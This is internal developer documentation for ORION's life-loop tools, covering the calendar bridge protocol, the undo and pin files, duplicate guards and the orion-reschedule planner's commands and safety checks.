| `distraction.mjs` | `decide({now, usage:{social, video, games}, windowMinutes (30..120), current, bedtime, recentNudges, lockAllowed})` -> `{action: "none"|"nudge"|"lock", reason, minutes}`. Protected kinds (rest, meal, social) never nudge. Past bedtime with >= 10 min of distraction nudges (lock after 2 nudges if allowed, 30 min). In a work block (class, study, deadline, side_project) with >= 15 min distraction: nudge, or lock for `clamp(untilEnd, 15, 45)` after 2 nudges. With no block and distraction >= 75% of the window: nudge "long scroll" | `:6-32` | Tests only; the phone side (`native/OrionMobile/App/ScreenWatch.swift:12`) says its decisions follow this file. `37c29fd`; "Written by Claude after Qwen's run stopped" |
| `sync-event.mjs` | The offline change-event format. Kinds: `capture.add`, `reminder.add`, `reminder.complete`, `reminder.update`, `tracking.log`, `plan.change`, `note.append`. Valid event: `device` (`/^[a-z0-9-]{1,40}$/`), integer `clock >= 1`, known `kind`, integer `at >= 0`, object `payload` <= 8000 bytes, and `id === "<device>:<clock>"`. `makeEvent` builds and validates | `:2-25` | Tests only (+ imported by sync-merge). `febbb60` |
| `sync-merge.mjs` | `mergeLogs(...logs)`: drop invalid events, dedupe by `id` (on a conflicting duplicate keep the one with the smaller `JSON.stringify`), sort by `at`, then `device`, then `clock`: both devices reach the same order. `since(log, cursor)`: events newer than a per-device clock cursor | `:6-18` | Tests only. `f76180a` |
| `sync-apply.mjs` | `applyEvents(state, events)` folds a merged log into `{captures[], reminders{}, tracking[], notes{}, applied[], lastPlanChange?}` idempotently via the `applied` id list. A `note.append` is accepted only for a filename matching `/^[a-z0-9-]+\.md$/` (no path traversal). Unknown kinds are skipped (not marked applied) | `:4-37` | Tests only. `6896901`. The review packet says the phone currently keeps an outbox of link commands instead of this event log (`docs/planning/v2/LIFE_LOOP_REVIEW.md`, "Needs wiring") |

---

### 2.12 Cross-cutting gotchas (the short list to remember)

1. **Weekday numbering differs**: JS 0 = Sunday in `plan-parse`, `task-spread`; ISO 1 = Monday in `config.gymDays`, `fill-day`, `daily-needs`, `weekly`, `night`'s blocks use none. A mismatch silently shifts gym days by one.
2. **Bare-hour guess uses today's clock for any date** (`plan-parse.mjs:171`): "tomorrow at 9" said after 9 AM becomes 9 PM.
3. **`todo-parse` reads "for 2 hours" as 2 minutes -> 10**; `orion-reschedule` compensates with `minutesIn`, `orion-tasks:88` does not.
4. **`lateness` trend looks at the oldest records** (`:147-148`), contrary to its comment.
5. **`config.ranks` does not affect `replan`**; it only changes the words ORION says (`orion-remote:567-581`) and what the brain is seeded with (`orion-brain-seed:111`).
6. **A displaced block that does not fit is deleted from the calendar** (and reported); a must-have that does not fit aborts the whole command (`orion-reschedule:942, 976-978`).
7. **Live config differs from code defaults** (`commuteMinutes` 45 vs 30, `bufferMinutes` 5 vs 10), and `early.mjs` has its own defaults (45/5).
8. **Corrupt state files behave inconsistently**: `loadConfig` swallows parse errors (defaults); `readPins` throws on anything but `ENOENT` and so aborts every plan write; `skips`/`history`/`calendar-write` journals swallow and start empty.
9. **Eight modules are not wired into any CLI** (`block`, `day-review`, `distraction`, `grant-policy`, `sync-*`, `weekly`); three read-only reports use `lateness`/`patterns`. Their only consumers are tests and Swift code that copies their rules.
10. **`morning-brief` never shows weather** and `bedtime` never escalates by nudge count at HEAD, because their callers do not pass the inputs (`orion-watch:164-169`, `orion-now:46`).
11. **`plan-parse` and `todo-parse` are heuristics, not understanding.** Both print what they understood (`(read from his words: ...)`, `[assumed 60 min]`) so the model, and Nick, can catch a wrong guess; treat their output as a proposal.


---

## 3. The life-loop CLIs the model and cron call

> Snapshot: branch `orion-v2/backlog-checkpoint`, HEAD `6c93032` (2026-10-14), dirty worktree. Everything here is plain Node (`#!/usr/bin/env node`, ES modules, no dependencies) under `scripts/`, with shared logic in `scripts/lib/life/`. Where a claim is **(inferred)** it was not read directly in code.

### In this section

| # | Part | What it covers |
|---|------|----------------|
| 3.0 | Map and conventions | The three families of CLI, exit codes, "NOTHING WAS CHANGED", sandbox/eval mode, installed copy vs repo copy |
| 3.1 | The calendar write path | `OrionMacBridge` JSON-lines protocol, event identity and the `[orion:kind]` tag, move/delete/create semantics, undo journal, pins, skips, duplicate guards |
| 3.2 | `orion-reschedule` | Every subcommand and flag of the main planner CLI, plus the pipeline it runs |
| 3.3 | The planner library (`scripts/lib/life`) | replan, day-check, lengths/shrink, commute walls, config |
| 3.4 | `orion-agenda`, `orion-agenda-change` | Read-only calendar wrapper vs typed mutation wrapper |
| 3.5 | `orion-tasks` | To-dos with due dates and spreads, sessions booked through `orion-reschedule` |
| 3.6 | `orion-plan-study`, `orion-study`, `orion-next`, `orion-now`, `orion-life`, `orion-patterns`, `orion-quick`, `orion-waiting` | Smaller life-loop CLIs |
| 3.7 | `orion-watch`, `orion-watches`, `orion-checkin`, `orion-morning` | The tickers that speak first |
| 3.8 | `orion-standing`, `orion-daily` | Cron-shaped CLIs: say-only-what-changed brief and the nightly memory rollup |
| 3.9 | `orion-project`, `orion-projects`, `orion-project-agent`, `orion-project-queue`, `orion-project-run` | Milestone tracker vs the local project-agent runner |
| 3.10 | `orion-note`, `orion-recall`, `orion-remember`, `orion-why`, `orion-undo`, `orion-mode` | Memory and authority helpers (short form) |
| 3.11 | Who calls what | Table: model tool, app, phone link, cron/automation to CLI |
| 3.12 | Cron and LaunchAgents | What actually schedules these |

Related chapters: `docs/learn/04_plugin_core_actions_gate.md` (the typed-action gate, `calendar_event_add` tier), `docs/learn/05_plugin_turn_pipeline.md` (claims, reply-lint, work-check), `docs/learn/10_end_to_end_walkthroughs.md`.

---

### 3.0 Map and conventions

**What it is.** ORION's "life loop" is the set of programs that read Nick's Apple Calendar and Reminders, decide how to rearrange a day around what happened, write the result back, and then talk to Nick unprompted ("check-ins", morning brief, watches). The model never edits calendar data itself. It runs one of these CLIs (via `exec`, allowlisted by full path) or the plugin runs them for it. The deterministic planner is the product; the model's job is to pick the right subcommand and phrase the output.

**Three families.**

1. **Planner and writers** (change his calendar or to-do list): `orion-reschedule`, `orion-tasks`, `orion-plan-study --book`, `orion-agenda-change`, `orion-watch` (it writes calendar blocks itself on a short night).
2. **Readers** (never write the calendar): `orion-agenda`, `orion-now`, `orion-next`, `orion-study`, `orion-quick`, `orion-patterns`, `orion-waiting`, `orion-standing`, `orion-why`.
3. **Tickers / cron-shaped**: `orion-watch tick`, `orion-watches tick`, `orion-checkin tick`, `orion-morning signal`, `orion-standing auto|morning|evening|check`, `orion-daily`.

**Conventions you will see in every script.**

- **Refusals start with `NOTHING WAS CHANGED:`** (or `NOTHING WAS DROPPED:` / `NOTHING WAS BOOKED:`). The model-facing text relies on that exact prefix, and `schedule-flow.ts` (`FAILED` regex) and the work check read it. Exit code 1 means "valid command, refused by state or by the day rules"; exit code 2 means "usage error / unknown option"; 0 is success or "nothing needed to move". (`scripts/orion-reschedule:79`, `:92`, `:107`, `:138`)
- **Unknown options are fatal.** Learned the hard way: on 2026-10-06 the model passed `--until 20:00` before it existed and told Nick things "didn't fit by 8 PM" (comment at `scripts/orion-reschedule:72-74`). The same rule was added to `orion-tasks` on 2026-10-13 after `--at 11:00` was silently ignored and a timed reminder became a to-do booked into the evening (`scripts/orion-tasks:42-49`, commit `b5bf4ab` 2026-10-13).
- **Atomic file writes**: state files are written to `*.tmp` then `renameSync`ed, with `mode: 0o600` for the ones holding personal data (`pins.json`, `watches.json`, `checkins.json`, `projects.json`).
- **Local days, not UTC.** `toLocaleDateString("en-CA")` everywhere. `orion-daily` once filed every day's memory under a UTC date (fix `71d4581`, 2026-08-11).
- **Sandbox / evaluation mode.** `scripts/lib/life/bridge-path.mjs:23-26` returns a sandbox day when an eval marker file exists (`eval-mode`, under two hours old, `scripts/lib/eval-mode.mjs`) AND `eval-calendar.json` exists. Then all bridge calls go to `scripts/lib/eval/sandbox-bridge.mjs` (a JSON file standing in for Calendar), the undo/pins/skips/config/check-in files become `eval-*` copies, and tickers (`orion-watch`, `orion-checkin tick`, `orion-watches tick`, `orion-morning`) exit without sending anything. This exists because on 2026-09-30 a scenario run asked "do I need an umbrella?" and a real message reached Nick's Discord (`scripts/lib/eval-mode.mjs:1-6`).
- **Test seams** (env vars): `ORION_RESCHEDULE_NOW` (fake clock, ISO string), `ORION_RESCHEDULE_UNDO`, `ORION_RESCHEDULE_PINS`, `ORION_BRIDGE_BIN` (fake bridge binary, always wins over sandbox), `ORION_SKIPS_FILE`, `ORION_LIFE_CONFIG`, `ORION_TASK_LEDGER`, `ORION_CHECKIN_FILE`, `ORION_WATCH_FILE`, `ORION_HEALTH_LOG`, `ORION_CONTROLLED_DIR`, `ORION_STANDING_AGENDA`.

**Gotcha: two copies of the scripts exist.** The model and the plugin run the **repo** copy (`/Users/nickmadaio/Desktop/ORION/scripts/...`, which is what the exec allowlist names and what `runOrionScript` spawns: `plugin/orion-control/src/executors.ts:4008-4020`). The Swift Mac app and the phone-link app run an **installed copy** under `~/.openclaw/orion-remote/scripts/` (`native/Orion/Sources/Orion/AppState.swift:101`, `native/Orion/Sources/Orion/LifeWatch.swift:26`, `native/OrionLink/App/LinkEngine.swift:147`). Reason: launchd-started processes cannot read `~/Desktop` (the macOS privacy sandbox), so the installer (`scripts/orion-remote-install`) copies scripts out. At snapshot time the installed copy dated 2026-10-08 07:42 was stale: `diff` showed `orion-reschedule` (missing `show`, the `--date tomorrow` word handling, the `--json` option), `orion-tasks` (missing `sweep` and the unknown-option guard) and `orion-watch` (missing the `orion-tasks sweep` call) all behind the repo, and `scripts/lib/life/task-notes.mjs` differing. `orion-checkin`, `orion-standing`, `orion-morning`, `orion-quick` were identical. So the ticker that runs from the app every 5 minutes (`orion-watch tick`) was running older logic than the repo until the next install. **(The `diff` results are observed; the consequence for live behaviour is inferred.)**

---

### 3.1 The calendar write path (OrionMacBridge)

**What it is.** There is no Calendar API in Node. Every calendar or Reminders read or write goes through one native Swift executable, `orion-mac-bridge`, built from `native/OrionMacBridge`. It speaks EventKit (macOS Calendar/Reminders store), holds the macOS privacy grants, and has a deliberately tiny, id-based interface.

**Where.**
- Swift: `native/OrionMacBridge/Sources/OrionMacBridge/Bridge.swift` (607 lines). Dispatch table `handle()` at `:75-180`; calendar functions `listUpcomingCalendarEvents` `:234`, `createCalendarEvent` `:421`, `moveCalendarEvent` `:447`, `getCalendarEvent` `:471`, `deleteCalendarEvent` `:497`; reminder functions `listIncompleteReminders` `:269`, `listReminderLists` `:297`, `moveReminder` `:318`, `createReminder` `:339`, `updateReminder` `:365`, `completeReminder` `:404`.
- Node client used by the planner: `scripts/lib/life/bridge-path.mjs:36-46` (`bridgeRequest`). Separate hand-rolled clients exist in `scripts/orion-agenda:75-101` and `scripts/orion-agenda-change:32-61`.
- Binary path resolution: `scripts/lib/life/bridge-path.mjs:18-20` prefers `~/.openclaw/orion-remote/bin/orion-mac-bridge`, else `native/OrionMacBridge/.build/release/orion-mac-bridge`. `orion-agenda` and `orion-agenda-change` hard-code the `.build/release` path (`scripts/orion-agenda:51-54`).

**The protocol: line-delimited JSON on stdin/stdout, one process per request.** It is not a daemon and not a socket. (There is a separate screen-control mode in the same binary; see another chapter.)

```swift
// native/OrionMacBridge/Sources/OrionMacBridge/Bridge.swift:6-16
struct Request: Decodable {
    let id: String
    let action: String
    let payload: [String: String]?
}
struct Response: Encodable {
    let id: String
    let ok: Bool
    let result: [String: String]?
    let error: String?
}
```

Every payload value is a **string** (`[String: String]`), which is why list results come back as JSON-inside-a-string fields (`events_json`, `reminders_json`) and why timestamps are ISO 8601 strings. The main loop reads lines from stdin until EOF (`Bridge.swift:49-60`). Special argv mode: `orion-mac-bridge authenticate` (owner Touch ID, exit code) and `--selftest` (`:35-48`).

The Node side shells out through `/bin/sh -c "printf '%s\n' '<json>' | \"<bin>\""` and takes the first stdout line beginning with `{`:

```js
// scripts/lib/life/bridge-path.mjs:36-45
export async function bridgeRequest(action, payload, { timeout = 30000 } = {}) {
  const request = JSON.stringify({ id: "life", action, payload }).replace(/'/g, "'\\''");
  ...
  const { stdout } = await run("/bin/sh", ["-c", `printf '%s\n' '${request}' | "${bin}"`], { timeout, maxBuffer: 8 << 20, env });
  const line = stdout.split("\n").find((l) => l.trim().startsWith("{"));
  const parsed = line ? JSON.parse(line) : null;
  if (!parsed?.ok) throw new Error(parsed?.error ?? "the calendar bridge did not answer");
  return parsed.result;
}
```

Hand-run example (read-only; do not run the create/move/delete forms on your own calendar):
`printf '%s\n' '{"id":"1","action":"list_upcoming_calendar_events","payload":{"from":"today"}}' | native/OrionMacBridge/.build/release/orion-mac-bridge`

**Calendar/Reminders actions the life loop uses** (payload keys are all strings):

| Action | Payload | Result | Notes |
|---|---|---|---|
| `list_upcoming_calendar_events` | `days` (default 7, clamped 1-60), `limit` (default 200, clamped 1-500), `from:"today"` | `events_json`: array of `{title,start,end,identifier,location,orion,allDay}` | `from:"today"` starts at local midnight so already-ended blocks are visible (added 2026-10-01: "extend the DS lab" failed because the lab had ended and ORION booked a second one). Reads **all** calendars (`calendars: nil`, `:241`). |
| `list_deadlines` | none | same, 90 days, `limit 40`, **non-recurring only** | Weekly classes would flood the list (`:234-238`, `oneOffOnly`). |
| `create_calendar_event` | `title`, `start`, `end` (ISO), optional `orionKind` (`^[a-z_]{1,20}$`) | `{status:"created", identifier}` | Saved to `store.defaultCalendarForNewEvents`, `span: .thisEvent` (`Bridge.swift:421-441`). |
| `move_calendar_event` | `identifier`, `start`, `end` | `{status:"moved",title,from,start}` | Changes start/end of one event/occurrence (`:447-466`). Used for both moving and resizing. |
| `get_calendar_event` | `identifier` | `{exists:"true"/"false",title,start,end}` | Exact readback; the 7-day list cannot verify an event a month away (`:468-490`). |
| `delete_calendar_event` | `identifier`, optional `start`, optional `span:"future"` | `{status:"deleted",title}` | **Identifier-only by design; no delete-by-title.** With `start`, only that occurrence of a repeating event is removed and a read-only calendar is refused with `read-only calendar: <name>`. (`:497-562`) |
| `list_incomplete_reminders` | optional `list` (case-insensitive name) | `reminders_json`: `{title,identifier,list,due?,notes?,priority?}`, capped 200 | `:269-295` |
| `create_reminder` | `title`, `list`, `due_at`, `notes`, `priority` | `{status:"created",identifier}` | Saved on named list else default (`:339-361`). |
| `update_reminder` | `identifier` + any of `title`, `due_at` (`""` clears), `notes`, `priority` | `{status:"updated"}` | A key left out is left alone (`:365-390`). |
| `complete_reminder` | `identifier`, `completed:"false"` reopens | `{status:"completed"/"reopened"}` | Added 2026-09-29 (a model asked "want me to delete that reminder?" when told to tick it off). |
| `move_reminder` | `identifier`, `list` | `{status:"moved",from,to}` | Same identifier, different list. |
| `list_reminder_lists` | none | rows `{title,identifier,open,...}` | |

**Event identity and tagging.**

- **Identity** is EventKit's `calendarItemIdentifier`. It travels with every listed event and is the only handle for move/delete. For a repeating event the identifier names the **series**, so deleting or moving with just the identifier hits the series' first occurrence; the planner therefore passes `start` for skip (comment at `Bridge.swift:520-523`, fix `e568abb` 2026-10-06 after "skip Marketing today" removed the wrong day).
- **Ownership tag.** Blocks ORION plans itself get this note body:

```swift
// native/OrionMacBridge/Sources/OrionMacBridge/Bridge.swift:437-440
if let kind = payload["orionKind"], kind.range(of: #"^[a-z_]{1,20}$"#, options: .regularExpression) != nil {
    event.notes = "Planned by ORION. It may move this block when your day changes. [orion:\(kind)]"
}
```

  On read, a regex `\[orion:([a-z_]+)\]` over `event.notes` yields the `orion` field (`:255-259`). `toBlocks` (`scripts/lib/life/live-day.mjs:40-59`) turns `e.orion` into `source:"orion"`, `fixed:false`, and `kind` = the tag (a legacy tag of `class` or `deadline` is downgraded to `study`).
- **Calendar name.** Events are created on whatever the macOS default calendar for new events is (`defaultCalendarForNewEvents`); the bridge has no per-calendar parameter. The calendar's name is not hard-coded anywhere in these scripts.
- **Nick's own plans stay unmarked.** `applyPlan` only sets `orionKind` when `!c.fixed` (`scripts/lib/life/calendar-write.mjs:78`), so a fixed plan written for him ("soccer 5-7") has no tag; it reads back as a calendar event, classified by its title.
- **What counts as movable on read** (`live-day.mjs:25-37`, `:52`): ORION-tagged blocks always move. Otherwise `fixed = kind is class/deadline OR !movable(title)`, where `movable` = not social (`isSocial`: "with", "friend", "club", "appointment", "meeting", "soccer practice", ...) AND the title matches `MOVABLE_ALONE` (study, gym, nap, groceries, laundry, side project, lunch/dinner, ...). Classification of the *kind* by title: `classify()` `live-day.mjs:13-23`.

**Dry-run vs apply.** There is no dry-run in the bridge. Dry-run lives in the CLIs: `orion-reschedule ... --dry-run` computes the whole plan, runs the same `refuseIfBroken` checks, prints `Would change ...` and never calls `applyPlan`. `orion-tasks plan --dry-run` does the same (it passes `--dry-run` through to `orion-reschedule day`). `orion-plan-study` is dry by default; `--book` applies. `orion-watch tick --dry-run` and `orion-watches tick --dry-run` skip writes and sends.

**The transaction: `applyPlan` and the undo journal** (`scripts/lib/life/calendar-write.mjs:59-101`).

1. For each `removed` block with a `calendarId`: `delete_calendar_event`, journaling `{op:"delete", identifier, title, start, end, orionKind?}`.
2. For each `move`: `move_calendar_event` with the new start and end (`toEnd` carries a length change), journaling the old start/end.
3. For each `created` block: `create_calendar_event`, journaling `{op:"create", identifier}`. Fixed plans carry no tag.
4. If any bridge call throws, `reverseSteps(undo)` runs the inverse of everything done so far, newest first, then the error is rethrown. If the rollback also fails the message says so (`:83-87`). This is rollback-on-error, not crash-safe atomicity (a process kill mid-run leaves a partial change; **inferred**, nothing journals ahead of the write).
5. Pins are updated (below), then the entry `{pinsBefore, at, group?, steps}` is appended to `~/.openclaw/orion-controlled/reschedule-undo.json`. The file keeps the **last 10 entries** (`.slice(-10)`, `:99`); `group` merges several `applyPlan` calls from one command into one undo step (`orion-plan-study --book` uses `group: "study-<ts>"`).

```js
// scripts/lib/life/calendar-write.mjs:103-113
export async function undoLast() {
  const history = (() => { try { return JSON.parse(readFileSync(UNDO_FILE, "utf8")); } catch { return []; } })();
  // Skip empty entries older versions wrote: undo always undoes something real.
  while (history.length && !(history.at(-1).steps ?? []).length) history.pop();
  const last = history.pop();
  if (!last) return [];
  const { done, restored } = await reverseSteps(last.steps);
  if (last.pinsBefore) savePins(Object.fromEntries(Object.entries(last.pinsBefore).map(([date, ids]) => [date, ids.map(id => restored.get(id) ?? id)])));
  writeFileSync(UNDO_FILE, JSON.stringify(history, null, 2));
  return done;
}
```

**Undo semantics and a quirk.** `orion-reschedule undo` pops the last entry. A `move` is undone by moving back; a `create` by deleting the new event; a `delete` by **creating a new event** with the recorded title/start/end (and the same `orionKind` if ORION had made it), so the restored event has a **new identifier**, which is why `restored` maps old to new ids and rewrites the pins. Consequence (read from code, not tested): undoing a `skip` of a real class on a **writable** calendar recreates it as a standalone event on the default calendar, not as part of the original recurring series. Undoing a skip on a **read-only** calendar just removes the entry from `skipped-events.json` (`unskip`).

**Pins** (`scripts/lib/life/pins.mjs`). When Nick states a time ("nap 90 at 13:00") the created event's identifier is saved in `~/.openclaw/orion-controlled/pins.json` as `{ "YYYY-MM-DD": [calendarId, ...] }`. `pinBlocks()` marks those blocks `fixed:true, pinned:true` so later cascades keep them, while `move/resize/extend/swap/rename/drop` still treat `pinned` blocks as movable by explicit command (`(!b.fixed || b.pinned)` checks all over `orion-reschedule`). Commit `0a0aa7e` 2026-10-02 ("preserve explicit times").

**Skips** (`scripts/lib/life/skips.mjs`). `orion-reschedule skip` first tries `delete_calendar_event` with the occurrence's `start`; if the calendar is read-only the occurrence is recorded in `skipped-events.json` (`{title,start}`, entries older than 14 days forgotten) and `calendarEvents()` filters it out of every view (`live-day.mjs:61-64`). Class calendars are typically read-only subscriptions **(inferred from the `read-only` branch and its comment, `orion-reschedule:499-500`)**.

**Duplicate guards** (several layers; the first three are in `orion-reschedule`):
1. **Restating replaces**: `day`/`add` with a title that matches an existing movable future block deletes the old one in the same transaction (`:883-885`; origin: "Dinner" twice on the calendar, 2026-09-30).
2. **Fixed plan already there at the same time**: filtered out as `alreadyFixed` and reported as "kept already-scheduled fixed plan" instead of creating a second copy (`:873-881`). This was "the source of the duplicate soccer events".
3. **Already happened today**: `day`/`add` for something that already ran (or is running) refuses with `NOTHING WAS CHANGED: X is already on today's calendar ...` unless `--again` (`:780-793`; 2026-10-01 a second "DS lab" was booked at 17:25).
4. **Single writer**: a lock directory `~/.openclaw/orion-controlled/reschedule.lock` created with `mkdirSync` (atomic); a stale lock older than 60 s is removed; waits up to 30 s then exits 1 "another change to his day is still running" (`:154-165`). Parallel `add` calls had been planning from the same old calendar and overwriting each other.
5. **`orion-agenda-change add` verifies by readback** (`get_calendar_event`) and `remove-title` refuses ambiguous exact-title matches (below).
6. The Swift app has its own, separate Calendar write path for hand-created events (`native/Orion/Sources/Orion/AppleCalendarSync.swift`): it records what it creates in `orion-created-events.json` and only edits events it created. That file is unrelated to `reschedule-undo.json`.

**Gotchas & lessons.**
- `native/OrionMacBridge/README.md` is **out of date**: it says the bridge "does not create, edit, send, or delete any Calendar or Reminders data". The code does all four (`create_calendar_event`, `move_calendar_event`, `delete_calendar_event`, reminder create/update/complete). Trust `Bridge.swift`.
- macOS attributes Calendar permission to the **responsible process**, not the binary. A terminal run inherits the terminal's grant; the gateway or the Swift app has its own. `orion-agenda` says so in its header (`scripts/orion-agenda:10-14`), and `orion-watch` is run from the Mac app "because this app holds the Calendar permission the calendar bridge needs" (`LifeWatch.swift:8-10`).
- The bridge's 7-day default window hides anything later, so verify far-future events with `get_calendar_event`, not the list.
- A bare `delete_calendar_event` with only an identifier on a recurring event is the dangerous case. The CLIs never do it without `start`, except `orion-agenda-change remove-title`, which takes an exact title and deletes by identifier (no `start`): that path is approval-gated in the plugin (`calendar_event_remove`: `approvalRequired: true`, `reversible: false`, `plugin/orion-control/src/catalog.ts:2839-2854`).

**Walk it yourself.**
- Open `native/OrionMacBridge/Sources/OrionMacBridge/Bridge.swift:75` and read the `switch request.action` list; compare to the table above.
- Open `scripts/lib/life/calendar-write.mjs:59` (`applyPlan`) and trace delete -> move -> create -> rollback.
- `cat ~/.openclaw/orion-controlled/reschedule-undo.json | head -40` to see real journal entries (titles only matter; no secrets). `cat ~/.openclaw/orion-controlled/pins.json`.
- `sed -n 1,50p scripts/lib/life/bridge-path.mjs` for the sandbox switch.

**Questions to ask your tutor.**
1. Why is the bridge one-process-per-request with string-only payloads, and what does that cost in complexity on the Node side (`events_json` inside JSON)?
2. Why does `delete_calendar_event` refuse to delete by title, and which CLI is the one exception, and how is it gated?
3. Walk through what happens to the undo journal if `create_calendar_event` fails halfway through a 6-block `day` command.
4. How does ORION decide that a calendar event is "its own" (movable) versus Nick's, and what are the two failure modes of using title regexes for the second case?
5. Explain how a recurring class can be skipped for one day when its calendar is read-only.
6. What breaks if the installed copy of `orion-reschedule` under `~/.openclaw/orion-remote` lags the repo copy?

---

### 3.2 `orion-reschedule` (993 lines, the most important CLI)

**What it is.** The one tool that changes Nick's day. A natural-language request ("I'm running late", "move study to 4", "swap X and Y", "I finished early") becomes one subcommand call. The script reads the calendar through the bridge, builds an in-memory model of the day, runs a deterministic planner (`replan`), checks the result against the day rules, and only then writes through `applyPlan`. All intelligence about *time arithmetic* lives here so that the model never has to do any. Header comment: `scripts/orion-reschedule:1-42`. First written in the "daily life loop" commit `37c29fd` (2026-09-30) and reworked roughly daily through 2026-10-12.

**Where (key regions).**

| Lines | What |
|---|---|
| 43-65 | imports of `scripts/lib/life/*` modules |
| 67-81 | argv parsing, `KNOWN` option set, unknown-option refusal |
| 88-109 | `COMMANDS` set, "one command per call" guard, per-command `OWN_OPTIONS` |
| 112-114 | bare date words (`2026-10-01`, `today`, `tomorrow`) |
| 126-147 | `projectDay`, `refuseIfBroken`, `verifyWritten` (the day-rule check before and after write) |
| 154-165 | single-writer lock |
| 167-171 | `undo` |
| 173-233 | config, clock, `--say`, `--date`, `show`, planning window |
| 237-259 | block-name matching: `sameThingEarly`, `closeness`, `closest` |
| 269-319 | `shapeAndCascade`, `lengthMoves`, `writeShape` (used by extend/resize/move/swap/minimums) |
| 321-333 | `findBlock`, `notFound`, `sensible` |
| 335-751 | one branch per subcommand |
| 753-771 | `--plan` item parsing for `day` |
| 780-802 | "already happened / already over" refusals |
| 808-836 | relative titles ("gym after soccer"), sequencing |
| 839-892 | drop / clear / replace sets, restated-block replacement |
| 894-898 | CLASH detection between fixed plans |
| 902-955 | planning call, rebuild, auto-shrink, `--fill` |
| 956-993 | output lines, must-have refusal, final `refuseIfBroken`, `applyPlan`, `verifyWritten` |

**How it works (the shared pipeline).**

1. **Parse.** `positional` = args that are not `--flags` and not the value of a value-flag (`--why --at --before --date --plan --say --until --then --to --after --by --now --gap --minutes`, `:69`). Note `--what` is not in that list; for `overrun --what "CS lab"` the value also lands in `positional` but is ignored because `flag("--what")` reads it separately (**inferred harmless**). `--plan` may repeat (`planArgs`, `:70`).
2. **Refuse nonsense early.** (a) Unknown `--option` -> exit 2 before anything runs (`:75-81`). (b) If a later positional word equals another command name ("drop X move Y --by 30"), refuse: one command per call (`:88-94`; 2026-10-07: the model sent `drop "send internship applications" move "Study" --by 30`, `drop` swallowed `move` and `Study` as titles, ignored `--by`, and ORION reported both changes as done). (c) Commands with a closed option list (`drop resize swap rename skip move show extend`) refuse foreign options (`:95-109`).
3. **Lock** (not for `--dry-run`): `reschedule.lock` directory, see 3.1.
4. **`undo`** short-circuits here (`:167-171`).
5. **Load context.** `loadConfig()` (3.3), `clockNow()` (real clock, or `ORION_RESCHEDULE_NOW`, or the eval sandbox's "now"), optional `--say` parse, `date` resolution (`--date` > bare date word > date inside `--say` > today; a date in the past is refused, `:197-198`), `patterns.wake.median` (his learned wake time, else config `usualWake`), then `calendarEvents()` -> `toBlocks(events, date)` -> `pinBlocks()` (`:213-216`).
6. **Planning window**: `{start: max(wake-60, 360), end: min(1440, asleepBy, --until)}` where `asleepBy` comes from `bedOn()` (`lib/life/night.mjs`: the "asleep by" line his phone alarm is set from) (`:227-233`). So "wind-down" ends exactly on the bed line.
7. **Branch** on the subcommand to build either `blocked` (lost time), `add` (new items) or a direct set of moves.
8. **Plan** with `replan(blocks, {now, window, blocked, soft, add, rebuild, buffer, keepFree})`. `soft` = the commute walls (3.3). Almost every call uses `rebuild: true`: "Always lay the remaining day out as a cascade ... nothing is flung to a far gap" (`:907-911`, after dinner was evicted to 22:33 by incremental mode on 2026-10-01).
9. **Overflow handling.** If anything is unplaced and `config.autoShrink !== false`, `shrinkPlan` lets breaks/side projects/optional items give up time down to their floors, then replans (`:927-940`).
10. **Check before write.** `refuseIfBroken(projectDay(...))` runs `checkDay` on the *projected* day and refuses with `NOTHING WAS CHANGED: <label> would break the day rules — ...` and exit 1 (`:135-140`, `:982`). "A plan that would overlap is never written" (header comment `:120-125`; origin 2026-10-01 Nick: "even after you reviewed and fixed it yourself there was still overlaps ... thats a design flaw").
11. **Must-haves.** If any item with importance 0 could not be placed, nothing is written: `NOTHING WAS CHANGED: must-haves could not fit` (`:976-981`).
12. **Write** `applyPlan(...)` (unless dry), then **read back** and re-run `checkDay`; an overlap now on the calendar prints `WARNING: his calendar now has an overlap` (`:141-147`). A failed read-back is deliberately not a failed write.
13. **Report.** Prints `Changed <Weekday> <date>:` then indented lines (`moved X: 09:00 → 10:00`, `planned X: 17:15–18:00`, `SHRUNK to fit`, `NOT BOOKED`, `SHIFTED`, `CLASH`, ...) and `Written to his calendar. "orion-reschedule undo" puts it back.` Those exact line shapes are parsed by `spokenReply()` in `plugin/orion-control/src/schedule-flow.ts` and by the work check (`work-check.ts:183-205`).

```js
// scripts/orion-reschedule:75-81
const KNOWN = new Set(["--after", "--again", "--at", "--before", "--by", "--check", "--date", "--dry-run", "--fill", "--fixed", "--gap", "--json", "--minutes", "--now", "--plan",
  "--replace", "--say", "--then", "--to", "--todos", "--until", "--what", "--why"]);
const unknown = args.filter((a) => a.startsWith("--") && !KNOWN.has(a));
if (unknown.length) {
  console.error(`NOTHING WAS CHANGED: orion-reschedule has no ${unknown.join(", ")} option. Options: ${[...KNOWN].join(" ")}. See the header for which command takes which.`);
  process.exit(2);
}
```

**Block matching rules** (these cause many bugs, so know them). `sameThingEarly(a,b)` (`:237-238`): tokenise, lowercase, strip non-alnum, keep **5-letter stems** ("studying"~"study"), but a token containing a digit stays whole (`cs2101` != `cs2100`; fix 2026-10-11 after both became `cs210`), drop tokens under 3 letters, then every token of `a` must appear in `b`. `closeness()` ranks 3 same normalised title, 2 same words both ways, 1 his words are contained; `closest()` keeps only the top rank (`:245-255`). Why: 2026-10-07 "CS lab" matched the **CS2100 Lab class** before the CS lab block, so `move` refused and `skip` deleted the class (commit `2f89313`). `findBlock(name)` prefers the block under way, else (if `allowPast`) the latest that already ended today, else the next upcoming (`:321-326`).

**Subcommands and flags (every one).**

Global options valid on most commands: `--dry-run` (plan and print, write nothing), `--date YYYY-MM-DD|today|tomorrow|<weekday>` (default today; weekday = the *next* one, 1-7 days ahead; `dayWord`, `:187-196`), and a bare date/`today`/`tomorrow` word in place of `--date` (`:112-114`).

| Command | Syntax | Effect and rules |
|---|---|---|
| `show` | `show [--json] [--date D]` | **Read-only.** Prints `{date, now, blocks:[{title,start,end,fixed,pinned,kind}]}` as JSON (past blocks included). Exists so code (schedule-flow) can number the day for a small model (`:217-224`, added 2026-10-12, `f0b2b67`). `fixed` is false for pinned blocks. |
| `late` | `late <5-600 minutes> [--why "<text>"]` | Lost time from now: adds a wall `[now, now+n]` titled `--why` or "running late"; movable blocks slide (`:335-337`). |
| `busy` | `busy HH:MM-HH:MM [--why "<text>"]` | Same, for an explicit window; end must be after start (`:348-351`). |
| `overrun` | `overrun <5-240 minutes> [--what "<class>"] [--date D]` | A class runs over: wall from that class's end to end+n, **plus `commuteMinutes` if it is a class** (the trip home moves). With no `--what`, the class under way or next (`:338-347`). |
